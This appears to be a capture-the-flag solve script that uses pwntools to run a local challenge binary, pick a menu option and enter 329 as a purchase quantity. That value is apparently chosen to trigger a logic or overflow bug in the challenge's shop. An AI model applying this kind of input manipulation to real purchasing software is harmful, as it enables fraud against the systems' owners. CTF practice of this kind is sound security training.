from pwn import *

p = process("./chall")

payload = b'1 \n'
p.sendafter("choice: ",payload)
payload = b'329 \n'
p.sendafter("to buy: ",payload)

p.interactive()